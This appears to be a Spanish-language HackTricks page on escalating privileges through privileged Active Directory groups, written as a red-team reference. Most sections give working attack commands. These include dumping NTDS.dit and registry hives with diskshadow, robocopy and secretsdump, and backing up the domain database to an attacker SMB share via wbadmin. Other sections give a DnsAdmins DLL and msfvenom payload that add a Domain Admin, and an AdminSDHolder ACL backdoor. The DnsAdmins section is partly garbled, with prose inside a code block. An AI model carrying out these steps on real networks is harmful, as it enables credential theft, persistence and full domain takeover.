# Grupos privilegiados

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**artículos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Grupos conocidos con privilegios de administración

* **Administradores**
* **Administradores de dominio**
* **Administradores de empresa**

## Operadores de cuentas

Este grupo tiene la capacidad de crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Controlador de Dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Se permite agregar nuevos usuarios, así como iniciar sesión local en DC01.

## Grupo AdminSDHolder

La Lista de Control de Acceso (ACL) del grupo **AdminSDHolder** es crucial ya que establece permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo garantiza la seguridad de estos grupos al evitar modificaciones no autorizadas.

Un atacante podría explotar esto modificando la ACL del grupo **AdminSDHolder**, otorgando permisos completos a un usuario estándar. Esto le daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de este usuario se modifican o eliminan, se restablecerían automáticamente en una hora debido al diseño del sistema.

Los comandos para revisar los miembros y modificar los permisos incluyen:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script está disponible para agilizar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Papelera de reciclaje de AD

La membresía en este grupo permite la lectura de objetos de Active Directory eliminados, lo que puede revelar información sensible:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acceso al Controlador de Dominio

El acceso a los archivos en el DC está restringido a menos que el usuario sea parte del grupo `Operadores de Servidor`, lo que cambia el nivel de acceso.

### Escalada de Privilegios

Usando `PsService` o `sc` de Sysinternals, uno puede inspeccionar y modificar los permisos del servicio. El grupo `Operadores de Servidor`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite la ejecución de comandos arbitrarios y la escalada de privilegios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que los `Operadores de servidor` tienen acceso completo, lo que permite la manipulación de servicios para obtener privilegios elevados.

## Operadores de copia de seguridad

La membresía en el grupo `Operadores de copia de seguridad` proporciona acceso al sistema de archivos de `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten la navegación de carpetas, la lista y la copia de archivos, incluso sin permisos explícitos, utilizando el indicador `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.

Para listar los miembros del grupo, ejecuta:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las bibliotecas necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar y verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos de directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque a AD

El acceso directo al sistema de archivos del Controlador de Dominio permite el robo de la base de datos `NTDS.dit`, la cual contiene todos los hashes NTLM de los usuarios y computadoras del dominio.

#### Usando diskshadow.exe

1. Crear una copia sombra de la unidad `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` desde la copia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, utiliza `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraer `SYSTEM` y `SAM` para recuperar el hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Obtener todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Usando wbadmin.exe

1. Configurar el sistema de archivos NTFS para el servidor SMB en la máquina del atacante y almacenar en caché las credenciales SMB en la máquina objetivo.
2. Utilizar `wbadmin.exe` para realizar copias de seguridad del sistema y extraer `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para ver una demostración práctica, consulta el [VIDEO DE DEMOSTRACIÓN CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden aprovechar sus privilegios para cargar una DLL arbitraria con privilegios del SISTEMA en un servidor DNS, a menudo alojado en Controladores de Dominio. Esta capacidad permite un gran potencial de explotación.

Para listar los miembros del grupo DnsAdmins, utiliza:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ejecutar DLL arbitraria

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) utilizando comandos como:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar el servicio de DNS (lo cual puede requerir permisos adicionales) es necesario para que se cargue el DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para obtener más detalles sobre este vector de ataque, consulta ired.team.

#### Mimilib.dll
También es factible utilizar mimilib.dll para la ejecución de comandos, modificándola para ejecutar comandos específicos o shells inversos. [Consulta esta publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para obtener más información.

### Registro WPAD para MitM
Los DnsAdmins pueden manipular registros DNS para realizar ataques de Man-in-the-Middle (MitM) creando un registro WPAD después de deshabilitar la lista de bloqueo de consultas globales. Herramientas como Responder o Inveigh pueden ser utilizadas para suplantación y captura de tráfico de red.

### Lectores de registros de eventos
Los miembros pueden acceder a los registros de eventos, potencialmente encontrando información sensible como contraseñas en texto plano o detalles de ejecución de comandos:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permisos de Windows de Exchange
Este grupo puede modificar DACLs en el objeto de dominio, potencialmente otorgando privilegios de DCSync. Las técnicas de escalada de privilegios que explotan este grupo se detallan en el repositorio de GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores de Hyper-V
Los Administradores de Hyper-V tienen acceso completo a Hyper-V, lo que puede ser explotado para obtener control sobre Controladores de Dominio virtualizados. Esto incluye clonar DCs en vivo y extraer hashes NTLM del archivo NTDS.dit.

### Ejemplo de Explotación
El Servicio de Mantenimiento de Mozilla de Firefox puede ser explotado por los Administradores de Hyper-V para ejecutar comandos como SYSTEM. Esto implica crear un enlace duro a un archivo protegido del sistema y reemplazarlo con un ejecutable malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## Gestión de la Organización

En entornos donde se implementa **Microsoft Exchange**, un grupo especial conocido como **Organization Management** posee capacidades significativas. Este grupo tiene el privilegio de **acceder a los buzones de correo de todos los usuarios del dominio** y mantiene **control total sobre la Unidad Organizativa 'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede ser explotado para la escalada de privilegios.

### Explotación de Privilegios y Comandos

#### Operadores de Impresión
Los miembros del grupo **Print Operators** están dotados de varios privilegios, incluido el **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Controlador de Dominio**, apagarlo y gestionar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto sin elevación, es necesario eludir el Control de Cuentas de Usuario (UAC).

Para listar los miembros de este grupo, se utiliza el siguiente comando PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para obtener técnicas de explotación más detalladas relacionadas con **`SeLoadDriverPrivilege`**, se deben consultar recursos de seguridad específicos.

#### Usuarios de Escritorio Remoto
Los miembros de este grupo tienen acceso a las PC a través del Protocolo de Escritorio Remoto (RDP). Para enumerar estos miembros, están disponibles comandos de PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
#### Usuarios de Administración Remota
Los miembros pueden acceder a PCs a través de **Windows Remote Management (WinRM)**. La enumeración de estos miembros se logra a través de:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para las técnicas de explotación relacionadas con **WinRM**, se debe consultar documentación específica.

#### Operadores de servidor
Este grupo tiene permisos para realizar varias configuraciones en Controladores de Dominio, incluyendo privilegios de copia de seguridad y restauración, cambiar la hora del sistema y apagar el sistema. Para enumerar los miembros, se proporciona el siguiente comando:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referencias <a href="#referencias" id="referencias"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Aprende hacking de AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
